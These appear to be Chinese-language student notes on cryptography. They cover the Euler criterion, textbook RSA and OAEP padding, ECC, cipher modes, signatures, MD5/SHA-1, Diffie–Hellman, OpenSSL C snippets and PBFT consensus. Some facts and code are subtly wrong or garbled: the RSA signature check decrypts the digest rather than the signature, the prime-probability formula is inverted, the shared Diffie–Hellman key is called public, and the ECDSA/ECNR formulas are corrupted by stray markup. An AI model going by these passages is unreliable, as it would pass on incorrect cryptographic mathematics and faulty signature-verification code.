<p><img src="Basic/Secure/Crypto/../images/image-20210627153945233.png" alt="image-20210627153945233" /></p>
<p>欧拉准则：</p>
<blockquote>
<p>若$p&gt;2$是一个素数，x是一个整数，$gcd(x,p)=1$，如果同余方程$x^2\equiv a(mod\ p)$有解$x\in Z_p$，则称a是模p的<strong>平方剩余</strong>，否则称a是模p的<strong>非平方剩余</strong>。</p>
<p>欧拉准则：若$p&gt;2$是一个素数，x是一个整数，$gcd(x,p)=1$，我们有：</p>
<ol>
<li>x是模p的<strong>平方剩余</strong>当且仅当$x^{(p-1)/2}\equiv 1(mod\ p)$</li>
<li>x是模p的<strong>非平方剩余</strong>当且仅当$x^{(p-1)/2}\equiv -1(mod\ p)$</li>
</ol>
</blockquote>
<p>证明：</p>
<blockquote>
<ol>
<li>
<p>如果x是模p的<strong>平方剩余</strong>，那么存在$y$使得$x\equiv y^2 (mod\  p)$。由于$gcd(x,p)=1$，所以$y \not\equiv 0(mod\ p)$。根据费马小定理，$y^{p-1}\equiv 1(mod\ p)$，所以$x^{(p-1)/2} \equiv 1(mod\ p)$。
反过来，如果$x^{(p-1)/2} \equiv 1(mod\ p)$，<strong>不妨假设$x\in Z_p = {0,1,2...p-1}$，我们有$Z_p^*={1,2,3...p-1}$是一个循环群</strong>（有点费解，可以记住）。那么存在一个<strong>生成元b</strong>，使得$x=b^i\ mod\ p, 1\le i \le p-1$。
所以$1\equiv x^{(p-1)/2}mod\ p\equiv (b^i)^{(p-1)/2}mod\ p\equiv b^{i(p-1)/2}mod\ p$。因为b的阶是p-1，所以$b^{i/2}mod\ p=1$，所以i是偶数。所以我们可以找到$y=b^{i/2}$使得$x\equiv y^2(mod\ p)$。</p>
</li>
<li>
<p>因为p是奇素数，$gcd(x,p)=1$，根据费马小定理，我们有$(x^{(p-1)/2}+1)(x^{(p-1)/2}-1) = x^{p-1}-1=0 (mod\ p)$。所以我们有$x^{(p-1)/2} = 1(mod\ p)$或$x^{(p-1)/2} = -1(mod\ p)$。前者就是1的情况，所以是后者。</p>
</li>
</ol>
</blockquote>
<p>RSA算法的证明：准确的说，是证明加密函数是解密函数的逆函数。</p>
<p><img src="Basic/Secure/Crypto/../images/image-20210628201957779.png" alt="image-20210628201957779" /></p>
<h4 id="介绍"><a class="header" href="#介绍">介绍</a></h4>
<p>非对称密码（公钥密码体制），加密密钥和解密密钥是不同的。</p>
<pre><code class="language-c">选取两个大素数，p和q。计算乘积n=p*q。
n公开，p q保密。	//建立在大素数难以分解的前提下，知道n难以推出p q。大是要2^1024这个级别。

然后随机选取加密密钥e，使得Phi(n) = (p-1)(q-1)和e互素。e公开	//所以可以让e是一个素数
接着要找出d，使得 e*d = 1 mod Phi(n)。d保密 	 			 //就是乘法逆元

所以n,e是公开的。e被称为公钥。
p,q,d是保密的。d被称为私钥。

接下来我们对明文x进行加密，得到密文y。
加密过程: y = x^e % n	记做 y=e(x)		
解密过程: x = y^d % n	记做 x=d(y)
</code></pre>
<p>RSA加密算法要比诸如AES的对称加密算法慢很多，因为涉及大量的计算。一般用于加密小规模的数据，比如用来加密AES的密钥。</p>
<p>所以，使用RSA算法的关键在于前两点，RSA算法的正确性在于第三点：</p>
<ol>
<li>e和d的选取</li>
<li>大素数p,q的生成</li>
<li>解密是加密的逆函数，即$x=d(e(x))$</li>
</ol>
<h5 id="e和d的选取"><a class="header" href="#e和d的选取">e和d的选取</a></h5>
<p>e和d的选取可以用扩展欧几里徳算法，在上面有介绍。$gcd(e,\Phi(n))=a\Phi(n)+de$。所以如果gcd=1,那么我们找到的d就是了。或者选一个素数e，那么我们算出的d就是我们要的。</p>
<h5 id="大素数生成"><a class="header" href="#大素数生成">大素数生成</a></h5>
<p>随机生成一个奇数$\widetilde{p}$，是素数的概率$P(\widetilde{p}\ is\ prime) ≈ 2ln(\widetilde{p})$。</p>
<p>检测奇数是否是素数。不过肯定不能用因式分解法了，要是能分解的话RSA就没意义了。那么我们是怎么检测是否是素数的呢？需要进行<strong>素性测试</strong>，但是<strong>素性测试保证不同过测试的一定是合数，通过的大概率是素数</strong>。</p>
<h4 id="padding"><a class="header" href="#padding">padding</a></h4>
<p>上面介绍的叫做“textbook RSA&quot;，存在一些缺陷（如下）而不被直接使用。现实中的RSA一般会结合填充方案一起使用。</p>
<ul>
<li>延展性：如果密文y被攻击者操控，可以把$y$变成$s^ey$，那么我们解密得到$x' = y^d % n = (sx)^{ed} % n = sx$。这样是不好的。</li>
<li>x=0,x=1,x=-1产生的密文是y=0,y=1,y=-1。</li>
</ul>
<blockquote>
<p>M是要被填充的消息，k是n的字节长度，|H|是哈希函数输出字节长度，|M|是消息长度。</p>
<ol>
<li>Generate a string <strong>PS</strong> of length $k − |M| −2|H| −2$ of zeroed bytes. The length of <strong>PS</strong> may be zero.</li>
<li>Concatenate Hash(L), PS, a single byte with hexadecimal value 0x01, and the message M to form a data block DB of length $k − |H| −1$ bytes as $DB = Hash(L)||PS||0x01||M$.</li>
<li>Generate a random byte string seed of length |H|.</li>
<li>Let $dbMask = MGF(seed,k−|H|−1)$, where MGF is the mask generation function. In practice, a hash function such as SHA-1 is often used as MFG.</li>
<li>Let $maskedDB = DB⊕dbMask$.</li>
<li>Let $seedMask = MGF(maskedDB,|H|)$.</li>
<li>Let $maskedSeed = seed ⊕seedMask$.</li>
<li>Concatenate a single byte with <strong>hexadecimal value 0x00, maskedSeed and maskedDB</strong> to form an encoded message EM of length k bytes as $EM = 0x00||maskedSeed||maskedDB$.</li>
</ol>
</blockquote>
<p><img src="Basic/Secure/Crypto/../images/image-20210531193445201.png" alt="image-20210531193445201" /></p>
<h4 id="攻击-1"><a class="header" href="#攻击-1">攻击</a></h4>
<p>协议攻击：比如textbook RSA就是不安全的。不过填充能很大程度上解决问题。</p>
<p>如果你能把n分解质因数，就可以知道pq，就可以知道d。当然，这也是RSA的根本安全保障。</p>
<p>旁道攻击</p>
<h3 id="ecc-非对称密钥加密算法"><a class="header" href="#ecc-非对称密钥加密算法">ECC 非对称密钥加密算法</a></h3>
<h4 id="数学基础-1"><a class="header" href="#数学基础-1">数学基础</a></h4>
<p>椭圆曲线可以定义成所有满足方程$E: y^2 \equiv  x^3 + ax + b\ mod\ p$的点$(x,y)$所构成的集合。
若$x^3 + ax + b$没有重复的因式或$4a^3+27b^2 \ne 0\  mod\ p$(称为判别式),则$E: y^2 \equiv  x^3 + ax + b\ mod\ p$能定义成为一个群。</p>
<p>定义成一个群，要<strong>元素集合</strong>还要有**“加法”**。元素集合就是椭圆曲线上的点$(x,y)$在加上一个无穷远处点，加法运算定义成两个点之间的连线和曲线的焦点（如果两点重合就是切线，PQ关于X轴对称焦点在无穷远处）（也叫做点加）。</p>
<p><img src="Basic/Secure/Crypto/../images/image-20210607184851892.png" alt="image-20210607184851892" /></p>
<p>用数学语言表示为：
$$
x_3 = s^2 −x_1 −x_2\ mod\ p\
y_3 = s(x_1 −x_3)−y_1\ mod\ p\
where\
s = \frac{y_2−y_1}{x_2−x_1}\ mod\ p;\ if\ P \ne Q\ (point\ addition)\
s = \frac{3x^2_1+a}{2y_1}\ mod\ p ;\ if\ P = Q\ (point\ doubling)
$$
椭圆曲线上的离散对数问题（Elliptic Curved Discrete Logarithm Problem）<strong>ECDLP</strong>：</p>
<blockquote>
<p>Given is an elliptic curve E. We consider a primitive element P
and another element T . The DL problem is finding the integer d, where 1 ≤ d ≤ #E, such that:</p>
<p>P+P+···+P = d×P = T.	(d times)</p>
<p>#E指的是群的阶，其实没有乘法这么一说，只是为了记号上的方便引入了×号。</p>
</blockquote>
<h4 id="加密应用"><a class="header" href="#加密应用">加密应用</a></h4>
<p>在密码体制中，d通常为整数，也是私钥。公钥T是曲线上的一个点，坐标为$(x_T,y_T)$。基点P也是公开的，T=dP。</p>
<ol>
<li>选择一个合适的椭圆曲线$E: y^2 \equiv  x^3 + ax + b\ mod\ p$（要求具有密码学的一些良好性质），选择一个基点$P(x_p,y_p)$。另外下面的$n=#E$，是曲线的阶。</li>
<li>生成一个随机数d(d&lt;#E)，作为<strong>私钥</strong>。计算T=dP作为<strong>公钥</strong>点。</li>
<li>加密，密文包括两部分r和s。加密需要公钥T和P，然后生成一个随机数k来加密明文m。
<ol>
<li>r=(k×P).x	; 其中k是一个<strong>随机数</strong>且k&lt;n ; r不可以mod n</li>
<li>s = m × (k×T).x mod n ; m是明文</li>
</ol>
</li>
<li>解密。解密需要私钥d，也需要公开的基点P，来解密密文r和s。
<ol>
<li>r=k×P	（这里的r是点，上面的r是数字，可以把r.x带入到椭圆曲线中得到r，所以是不需要k的）</li>
<li>m = s/(d×r).x         （= m × (k×T).x /  (d(k×P)).x = m(kd P).x/(kd P).x）</li>
</ol>
</li>
</ol>
<h2 id="分组加密模式"><a class="header" href="#分组加密模式">分组加密模式</a></h2>
<p>之前介绍的加密算法有的是是针对于特定长度的数据或数字的加密，那么怎么扩展到任意长度字节流呢。</p>
<p><strong>电子密码簿ECB</strong>模式的弱点是：对于相同内容的明文段，加密后得到的密文块是相同的。ECB模式的优点是:加密和解密过程均可以并行处理。</p>
<p><img src="Basic/Secure/Crypto/../images/1617014302680.png" alt="ECB" /></p>
<p><strong>密文块链接模式CBC</strong>模式的特点是：当前块的密文与前一块的密文有关; 加密过程只能串行处理; 解密过程可以并行处理。</p>
<p><img src="Basic/Secure/Crypto/../images/1617014309727.png" alt="CBC" /></p>
<p><strong>密文反馈模式CFB</strong>的优点是可以从密文传输的错误中恢复。</p>
<p>The plaintext is broken into 8-bit piece: $P = [P_1, P_2,...]$,where each $P_j$ has 8 bits, rather than 64 bits used in ECB and CBC. Encryption proceeds as follows. 
An initial 64-bit X1 is chosen. Then for $j=1,2,3,...$ the following is performed:
$$
for\ j=1,2,3...\
C_j = P_j ⊕ L8(Ek(X_j)) \
X_{j+1} = R_{56}(X_j) ‖ C_j
$$
then decryption is: 
$$
X_{j+1} = R_{56}(X_j) || C_j \
P_j = C_j ⊕ L8(Ek(X_j))	
$$
we have $X_j = R_{56}(X_{j-1})||C_{j-1} = R_{48}(X_{j-2})||C_{j-2}||C_{j-1} = ...$。</p>
<p><img src="Basic/Secure/Crypto/../images/1617014317127.png" alt="CFB" /></p>
<h2 id="数字签名"><a class="header" href="#数字签名">数字签名</a></h2>
<p>数字签名的目的是为了证明某个消息确实是由某人生成的。这是对称加密不能保证的特性。</p>
<h3 id="rsa-1"><a class="header" href="#rsa-1">RSA</a></h3>
<p>数字签名基本思路都是一样的：私钥加密摘要，公钥验证摘要。</p>
<pre><code class="language-c">m = md5(plaintext);             // 一般对明文的摘要做加密
M = RSA_encrypt_private(m);     // 用私钥加密,M就是所谓的签名
send(plaintext,M);
// ======================================================
m1 = md5(plaintext);
M1 = RSA_decrypt_public(m1);
check if M1==M
</code></pre>
<h3 id="ecdsa"><a class="header" href="#ecdsa">ECDSA</a></h3>
<p>签名：
$$
r = (k<em>G).x\ mod\ n	\qquad k是随机数且k&lt;n \
s = (m+r</em>d)/k\ mod\ n\qquad m是明文或hash, d是私钥
$$
验证：
$$
((m/s\ mod\ n)<em>G)+(r/s\ mod\ n</em>R).x\ mod\ n == r \qquad R是公钥
$$</p>
<h3 id="ecnr"><a class="header" href="#ecnr">ECNR</a></h3>
<p>符号和上面统一</p>
<p>签名：
$$
r = (k<em>G).x + m\ mod\ n	\
s = k-r</em>d\ mod\ n
$$
验证：
$$
r-(s<em>G+r</em>R).x\ mod \ n == m\ mod\ n
$$</p>
<h2 id="哈希算法"><a class="header" href="#哈希算法">哈希算法</a></h2>
<p>严格的说，哈希算法不是加密算法，因为是单向不可逆的。但是和数字签名有很大的关系。保证数据的integrity。用作数据的<strong>摘要digest</strong>。</p>
<p>哈希函数的安全性三个要素：</p>
<ol>
<li>preimage resistance (or one-wayness)</li>
<li>second preimage resistance (or weak collision resistance)</li>
<li>collision resistance (or strong collision resistance)</li>
</ol>
<p>hash family is a four-tuple (X,Y,J,H). X是可能的message，Y是可能的digest，K是keyspace，H $h_k:x \rightarrow y$。</p>
<h3 id="md5-1"><a class="header" href="#md5-1">MD5</a></h3>
<p><a href="https://rosettacode.org/wiki/MD5/Implementation#Python">MD5源代码</a>
MD5是以64byte为单位进行的。他会把数据利用<strong>填充</strong>政策，分成64 bytes的块。然后对块进行计算，计算结果依赖于前一个块的计算结果。</p>
<h4 id="填充"><a class="header" href="#填充">填充</a></h4>
<ol>
<li>假定该块大小n在[0,55]字节, 则在末尾补上以下数据: <code>0x80 0x00 0x00 0x00 ... 0x00</code> 共56-n个
例如<code>n==55</code>时，只要补0x80一个字节; 当<code>n==54</code>时，要补上0x80及0x00两个字节。</li>
<li>假定该块大小n在[56,63]范围内时, 则应在末尾补上64-n+56个字节。例如当<code>n==56</code>时, 应该补上64个字节; 当<code>n==57</code>时, 应该补上63个字节。补全的数据也是像<code>0x80 0x00 0x00 ...</code>之类的。</li>
<li>再在后面补上8个字节，这8个字节相当于一个64位的整数, 它的值=message总共的位数(不含填充内容)。</li>
</ol>
<p>所以最后会填充到64 byte的倍数，就可以以块为单位进行加密了。加密的结果称为摘要digest，digest的长度固定为128 bits, 即16 bytes。</p>
<h4 id="破解"><a class="header" href="#破解">破解</a></h4>
<p>有一种破解思路是彩虹表。</p>
<p>王小云。</p>
<h3 id="sha-1"><a class="header" href="#sha-1">SHA-1</a></h3>
<p>算出来的hash值达到160 bit，比Md5更安全。sha-1也是分块计算，每块也是64字节，当最后一块不足64字节也按照md5的方式进行填充。数据块的最后一定要补上表示报文总共位数的8个字节。</p>
<h2 id="diffifiehellman-key-exchange"><a class="header" href="#diffifiehellman-key-exchange">Diffifie–Hellman Key Exchange</a></h2>
<p>DH是现代非对称密码学的基础。他的数学基础是，$k ≡ (α^x)^y ≡ (α^y)^x mod\ p$。$x,y$就是通信双方的私钥，$k$就是公钥。他也是非对称加密，但是和RSA不同，他让通信双方<strong>共享了公钥</strong>。</p>
<p><img src="Basic/Secure/Crypto//Users/bytedance/Documents/note/Secure/images/image-20220815182419747.png" alt="image-20220815182419747" /></p>
<p><img src="Basic/Secure/Crypto//Users/bytedance/Documents/note/Secure/images/image-20220815182327642.png" alt="image-20220815182327642" /></p>
<h1 id="openssl"><a class="header" href="#openssl">Openssl</a></h1>
<p>Openssl里面处理的都是超大的数字，所以有<code>BIGNUM</code>类型来存储。</p>
<pre><code class="language-c">BIGNUM *a;	char A[0x100]=&quot;1234567890abcdef&quot;;
a = BN_new();					//开辟保存big number的空间	
BN_hex2bn(&amp;a,A);				//转化string（认为string里头是“数字”）为big number
BN_bin2bn(&amp;a,A);				//转化string（认为string里头是“编码”）为big number
printf(&quot;%s&quot;, BN_bn2hex(a));		//转换big number为string

BN_rand();						//生成随机大数
BN_free();						//释放空间
</code></pre>
<p>密码学的最后一次作业，可以叫做“Openssl库的使用“了。记得编译的时候链接上openssl，<code>gcc main.c -lcrypto</code>。</p>
<h2 id="md5代码示例"><a class="header" href="#md5代码示例">MD5代码示例</a></h2>
<p>所有的哈希函数都差不多是这样子调用的。</p>
<pre><code class="language-c">#include &lt;openssl/md5.h&gt;
#include &lt;string.h&gt;
int main{
    MD5(s,strlen(s),t);     //最简单的调用md5的办法
    //正规的调用办法
    char o[1000]={0};
    MD5_CTX t;
    MD5_Init(&amp;t);
    MD5_Update(&amp;t,&quot;123&quot;,3);
    MD5_Update(&amp;t,&quot;456&quot;,3);
    MD5_Final(o,&amp;t);
}
</code></pre>
<h2 id="rsa代码示例"><a class="header" href="#rsa代码示例">RSA代码示例</a></h2>
<pre><code class="language-c">#include &lt;openssl/rsa.h&gt;
#include &lt;openssl/bn.h&gt;
// 库函数 =====================================================================
RSA_generate_key();		//产生密钥
RSA_public_encrypt();	//公钥加密
RSA_private_decrypt();	//私钥解密
RSA_public_decrypy();	//公钥解密
RSA_new();				//分配一个RSA结构指针
RSA_free();				

RSA *prsa;
prsa = RSA_new();
RSA_set_flags(prsa,RSA_FLAG_NO_BLINDING);
RSA_set0_key(prsa,n,e,d);	//设置私钥，后来的版本是这样的，以前的版本直接修改RSA结构体
int flen = RSA_size(prsa);
RSA_private_encrypt(flen,ctext,ptext,prsa,RSA_NO_PADDING);	//私钥加密,设置不填充
RSA_public_decrypt(flen,ctext,ptext,prsa,RSA_PKCS1_PADDING);	//公钥解密,设置填充type1，当然这个和上面那个对不起来
</code></pre>
<pre><code class="language-c">#include &lt;openssl/rsa.h&gt;
#include &lt;openssl/bn.h&gt;
// textbook RSA ================================================
BIGNUM* rsa_encrypt_decrypt(BIGNUM *pin, BIGNUM *pn, BIGNUM *pe)
{
   BIGNUM *pout;
   BN_CTX *ctx;
   pout = BN_new();
   ctx = BN_CTX_new();
   BN_mod_exp(pout, pin, pe, pn, ctx);
   
   BN_CTX_free(ctx);
   return pout;
}
</code></pre>
<h2 id="ecc代码示例"><a class="header" href="#ecc代码示例">ECC代码示例</a></h2>
<p>放代码片段，里面有很多的椭圆曲线群的运算。</p>
<pre><code class="language-c">#include &lt;openssl/ec.h&gt;
#include &lt;openssl/rand.h&gt;
#include &lt;openssl/bn.h&gt;
/**
 * @brief ECC解密，按照Menezes-Vanstone公钥密码体制
 * 
 * @param group 		椭圆曲线确定的代数群
 * @param G 			基点
 * @param order 		椭圆曲线的阶
 * @param private_key 	ECC私钥
 * @param ciphertext_r 	密文的第一部分
 * @param ciphertext_s 	密文的第二部分
 * @return BIGNUM* 		明文
 */
BIGNUM *ecc_decrypt(EC_GROUP *group, EC_POINT *G, BIGNUM *order, BIGNUM *private_key, BIGNUM *ciphertext_r, BIGNUM *ciphertext_s)
{
    EC_POINT *T;
    BN_CTX *ctx;
    BIGNUM *tx, *ty;
    BIGNUM *plaintext; //
    ctx = BN_CTX_new();
    tx = BN_new(); 
    ty = BN_new();
    T = EC_POINT_new(group);

    EC_POINT_set_compressed_coordinates_GFp(group, T, ciphertext_r, 0, ctx); /* T=k*G;其中T的x坐标=r, y坐标自动计算 */
    EC_POINT_mul(group, T, NULL, T, private_key, ctx);                       /* T = d*k*G */
    EC_POINT_get_affine_coordinates_GFp(group, T, tx, ty, ctx);              /* tx = (d*k*G).x */
    BN_mod_inverse(tx, tx, order, ctx);                                      /* tx = tx^-1 = (k*R).x ^ -1 */

    plaintext = BN_new();
    BN_clear(plaintext);
    BN_mod_mul(plaintext, ciphertext_s, tx, order, ctx); /* m = s/(d*r).x = m * (k*R).x / (k*R).x = m */

    BN_free(tx);
    BN_free(ty);
    BN_CTX_free(ctx);
    EC_POINT_free(T);

    return plaintext;
}

/**
 * @brief ECC加密，按照Menezes-Vanstone公钥密码体制
 * 
 * @param group 		群
 * @param G 			基点
 * @param order         阶
 * @param public_key    公钥
 * @param plaintext     明文
 * @param ciphertext_r  这个其实是输出，密文的第一部分
 * @param ciphertext_s  这个其实是输出，密文的第二部分
 */
void ecc_encrypt(EC_GROUP *group, EC_POINT *G, BIGNUM *order, EC_POINT *public_key, BIGNUM *plaintext, BIGNUM *ciphertext_r, BIGNUM *ciphertext_s)
{
    long ticks;
    BIGNUM *k, *tx, *ty;
    EC_POINT *T;
    BN_CTX *ctx;

    ctx = BN_CTX_new();
    k = BN_new();
    tx = BN_new(); /* 临时点T的x坐标 */
    ty = BN_new(); /* 临时点T的y坐标 */

    ticks = (long)time(NULL);
    RAND_add(&amp;ticks, sizeof(ticks), 1); /* srand() */
    BN_rand(k, BN_num_bits(order), 0, 0);   /* 产生随机数k, 位数与n相等 */

    T = EC_POINT_new(group);
    EC_POINT_mul(group, T, k, NULL, NULL, ctx); /* T = k*G */

    EC_POINT_get_affine_coordinates_GFp(group, T, tx, ty, ctx); /* tx = (k*G).x */
    BN_copy(ciphertext_r, tx);                                             /* r = 密文第1部分 = (k*G).x; 注意(k*G).x不可以mod n */

    EC_POINT_mul(group, T, NULL, public_key, k, ctx);                    /* T = k*R = k*d*G */
    EC_POINT_get_affine_coordinates_GFp(group, T, tx, ty, ctx); /* tx = (k*R).x */

    BN_mod_mul(ciphertext_s, plaintext, tx, order, ctx);             /* s = 密文第2部分 = m * (k*R).x mod n */

    BN_free(tx);
    BN_free(ty);
    BN_free(k);
    BN_CTX_free(ctx);
    EC_POINT_free(T);
}
</code></pre>
<pre><code class="language-c">#include &lt;openssl/bn.h&gt;
// 获取ECC group 和基点 G ======================================
EC_GROUP *group;
EC_POINT *G, *R; 
group = EC_GROUP_new(EC_GFp_mont_method());
ctx = BN_CTX_new();
EC_GROUP_set_curve_GFp(group, p, a, b, ctx);
G = EC_POINT_new(group);
EC_POINT_set_affine_coordinates_GFp(group, G, gx, gy, ctx);
EC_GROUP_set_generator(group, G, order, BN_value_one()); /* 基点=G, G的阶=n, 余因子=1 */

n = ecc_decrypt(group,G,order,de,n10,n11);
d = ecc_decrypt(group,G,order,de,d10,d11);
x1 = ecc_decrypt(group,G,order,de,x20,x21);
x = rsa_encrypt_decrypt(x1,n,d);                // x的求解没有问题
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="密码学进阶"><a class="header" href="#密码学进阶">密码学进阶</a></h1>
<h2 id="密码学基础-1"><a class="header" href="#密码学基础-1">密码学基础</a></h2>
<blockquote>
<p>数论：整除和素数</p>
</blockquote>
<p>gcd/lcm</p>
<p>ideal</p>
<p>等价类和等价关系</p>
<p>Modular inverse </p>
<h2 id="可证明安全-1"><a class="header" href="#可证明安全-1">可证明安全</a></h2>
<p>Honest</p>
<p>Semi-honest: 诚实的遵守协议，但是好奇对方的输入</p>
<h3 id="离散对数问题"><a class="header" href="#离散对数问题">离散对数问题</a></h3>
<blockquote>
<p><strong>欧拉函数</strong>，对于正整数n，欧拉函数 $\varphi(n)$ 是小于或者等于n的正整数中与n互质的数的数目。</p>
<p><strong>欧拉定理</strong>，若n,a为正整数，且n,a互质，则 $a^{\varphi(n)} = 1(mod\ n)$</p>
<p>若n,a为正整数，且n,a互质，令 $a^d≡1(mod\ n)$，如果用 $\delta(n,a)$ 表示使该式成立的最小的正整数d，此时如果$\delta(n,a)=\varphi(n)$, 则称a为模n的<strong>原根</strong>。</p>
<p>若一个群G的每一个元都是G的某一个固定元a的乘方，则称G为<strong>循环群</strong>，记作$G=(a)={a^m |m∈Z}$，a称为G的一个生成元。举个例子，$G=(3)=3,$</p>
</blockquote>
<p>Discrete LogarithmL $g^s = h$.</p>
<p>如果整数k,a,b使得$b^k=a$。则此时$k=log_b(a)$称为离散对数。离散对数问题是定义在一个群上的，对于不同的群，难度不同。</p>
<p>两个相对容易计算的例子是：$R^∗$和$C^∗$上关于乘法操作构成的群；$Z/nZ$关于加法操作构成的群，也就是在这个群里bk里的bk实际上是k个b相加，此时问题变成 $kb≡a(mod\ n)$</p>
<p>下面的情况则是难的离散对数问题（也就是经典的离散对数问题）：<strong>取素数p，则Z/pZ关于乘法操作构成的群。</strong></p>
<h3 id="kekey-recovery-attack"><a class="header" href="#kekey-recovery-attack">KE(key recovery attack)</a></h3>
<p><strong>密钥恢复攻击</strong>是攻击者尝试恢复加密方案的加密密钥。通常，这意味着攻击者拥有一对或多于一对明文消息和相应的密文。</p>
<h3 id="cdhcomputational-diffie-hellman"><a class="header" href="#cdhcomputational-diffie-hellman">CDH(Computational Diffie-Hellman)</a></h3>
<h3 id="ddhdecisional-diffie-hellman-star"><a class="header" href="#ddhdecisional-diffie-hellman-star">DDH(Decisional Diffie-Hellman) :star:</a></h3>
<p>extremely useful in many protocals. SSH, SSL</p>
<h2 id="elgamal算法"><a class="header" href="#elgamal算法">Elgamal算法</a></h2>
<h2 id="安全多方计算-1"><a class="header" href="#安全多方计算-1">安全多方计算</a></h2>
<h2 id="零知识证明"><a class="header" href="#零知识证明">零知识证明</a></h2>
<h2 id="隐私保护求交"><a class="header" href="#隐私保护求交">隐私保护求交</a></h2>
<h2 id="隐匿查询"><a class="header" href="#隐匿查询">隐匿查询</a></h2>
<h2 id="加密数据库"><a class="header" href="#加密数据库">加密数据库</a></h2>
<h2 id="区块链共识"><a class="header" href="#区块链共识">区块链共识</a></h2>
<h3 id="拜占庭将军问题-bgp"><a class="header" href="#拜占庭将军问题-bgp">拜占庭将军问题 BGP</a></h3>
<p>参考链接： <a href="https://yangzhe.me/2019/11/06/byzantine-generals-problem/">解析</a></p>
<blockquote>
<p>一组拜占庭将军分别各率领一支军队共同围困一座城市。各支军队的行动策略为进攻或撤离两种。因为部分军队进攻部分军队撤离可能会造成灾难性后果，因此各位将军必须通过投票来达成<strong>一致策略</strong>，即所有军队一起进攻或所有军队一起撤离。因为各位将军分处城市不同方向，他们只能通过信使互相联系。在投票过程中每位将军都将自己投票给进攻还是撤退的信息通过信使分别通知其他所有将军，这样一来<strong>每位将军根据自己的投票和其他所有将军送来的信息</strong>就可以知道共同的投票结果而决定行动策略。</p>
<p>但是将军中间可能有叛徒，他们不仅可能向较为糟糕的策略投票，还可能选择性地发送投票信息。我们希望的是:</p>
<p><strong>A. 所有忠诚的将军可以达成一致的作战计划</strong>
<strong>B. 少数的叛徒不会导致忠诚的将军们无法达成一致</strong>。</p>
</blockquote>
<p>如果我们假设 $v(i)$ 为第 $i$ 个将军的作战计划，且每个将军使用某种方法将序列 $v(1),v(2),…,v(n)$ 转换成一个单一的作战计划。那么只要所有的将军使用相同的方法转换 $v(1),v(2),…,v(n)$，条件A就可以被满足。</p>
<p><strong>即使出现了伪造或错误的消息。只要有问题的将军的数量不到三分之一，仍可以达到“拜占庭容错”</strong></p>
<h3 id="实用拜占庭容错算法-pbft"><a class="header" href="#实用拜占庭容错算法-pbft">实用拜占庭容错算法 PBFT</a></h3>
<p>参考链接：<a href="https://yangzhe.me/2019/11/25/pbft/">非常好的解析</a>，<a href="https://medium.com/taipei-ethereum-meetup/intro-to-pbft-31187f255e68">繁体解析</a></p>
<p>我们先了解一下使用 PBFT 算法的分布式系统的概念，和算法对系统的一些要求：</p>
<ol>
<li>PBFT要求系统内的结点数量 n 不小于 3f+1，其中 f 为「恶意结点」的数量。这里的「恶意结点」可以是故意作恶的结点，也可以是被攻击被控制的结点，甚至是失去响应的结点，总之只要是不正常的，都可以认为是恶意的。</li>
<li>PBFT 将系统内的每个结点分成了两类：主结点和从结点。任一时刻内，只有一个主结点，其它结点都是从结点。但主结点是可以被更换的（更换主结点被称为「域转换」（View Change））。无论是主结点还是从结点，他们都使用状态机机制记录自己的操作。如果各结点的操作是一致的，那么它们的状态机的状态会一直保持一致。</li>
<li>向 PBFT 系统发送请求的端叫做「客户端」。当某个客户端想要向系统发送请求时，一般情况下，它会将请求发给当前的主结点；非一般情况下，它会将请求广播给所有结点。无论哪种情况，客户端都直接从各个结点（包括主结点）接收请求返回的数据。</li>
<li>客户端必须等待上一个请求完成以后，才会发送下一个请求。也就是说主结点和从结点们在某一时刻只会处理一个请求。这是一种同步发送请求的方式。如果客户端不等上一个请求返回就再次发送请求（即异步发送请求），那么请求的响应顺序可能不会是客户端发送的顺序。</li>
<li>PBFT 中有一个「域」( view )的概念（一般翻译成「视图」，但解析作者觉得「视图」这个词并不能表达原术语的意思，所以将它翻译成「域」）。某个结点担任主结点的过程，就是一个域。如果担任主结点的结点发生了变化，就是发生了「域转换」(View Change)。域是有编号的，每发生一次域转换，域编号就递增一次。如果将每个结点从 0 开始编号，那么我们可以通过算式 $i=v\ mod\ |R|$得到当前主结点的编号 $i$：其中 $v$ 为当前的域编号， $|R|$ 为结点数量。（如果把「域」比作「朝代」，可能会比较好理解一些：一个结点开始担任主结点，表示一个朝代的开始；主结点发生变更时，表示一个朝代的变更，朝代号就是加 1）</li>
</ol>
<p><strong>PBFT共识的建立</strong>三个阶段按执行顺序是 pre-prepare 阶段、 prepare 阶段、 commit 阶段。</p>
<ol>
<li>
<p>pre-prepare: 主结点收到客户端发送的请求之后，开始 pre-prepare 阶段。首先主结点 p 为收到的请求分配一个序号，记为 n（n 必须未被分配给其它请求，且比最近一次的请求的序号大）。然后广播消息 $⟨⟨PRE-PREPARE,v,n,d⟩_{σi},m⟩$ 给所有从结点。其 m 为结点收到的客户端请求； v 代表当前的域编号（view number）；n 为刚才分配给 m 的序号；d 为 m 的哈希值。</p>
<p>当从结点收到 ⟨PRE⟨PRE-PREPARE⟩PREPARE⟩ 消息后，会对其进行验证。</p>
</li>
<li>
<p>prepare: 如果某个从结点验证通过了某条 ⟨PRE-PREPARE⟩ 消息，那么它将进入 prepare 阶段，并广播消息 $⟨PREPARE,v,n,d,i⟩_{σi}$。（如果 ⟨PRE-PREPARE⟩ 消息验证不通过，就忽略它，什么也不做）</p>
<p>在从结点发出 ⟨PREPARE⟩⟨PREPARE⟩ 消息的同时，它也会接收别人广播过来的 ⟨PREPARE⟩⟨PREPARE⟩ 消息，并对其进行验证。</p>
</li>
<li>
<p>commit: 如果对于某个结点 i ，prepared(m,v,n,d,i) 为 true，那么这个结点将进入commit 阶段，并广播消息 $⟨COMMIT,v,n,i⟩_{σi}$。</p>
</li>
</ol>
<p><img src="Basic/Secure/Crypto/../images/normal-case-op.png" alt="img" /></p>
<p>PBFT 的完整流程：</p>
<ol>
<li>客户端向主结点发起请求，记为 $⟨REQUEST,o,t,c⟩_{σc}$。
其中 o 代表客户端请求的操作( operation )；t 代表时间戳；c 为客户端自己的标识。这里通过 t 来保证同一请求只会被发送和处理一次：如果主结点收到两个完全一样的请求，它将丢弃重复的请求；如果同一操作需要先后执行两次，客户端应该先后构造两个请求，且这两个请求的时间戳是不一样的。</li>
<li>主结点收到请求后，立即启动三阶段的共识过程，让所有从结点参与请求的处理。
三阶段的共识过程就是 pre-prepare、prepare、commit。</li>
<li>三阶段执行完成后，如果对于某一结点 i， committed-local(m,v,n,d,i) 的值为 true，则结点开始执行请求 m。执行成功后更改自己本地状态机的状态，并将结点直接返回给客户端。</li>
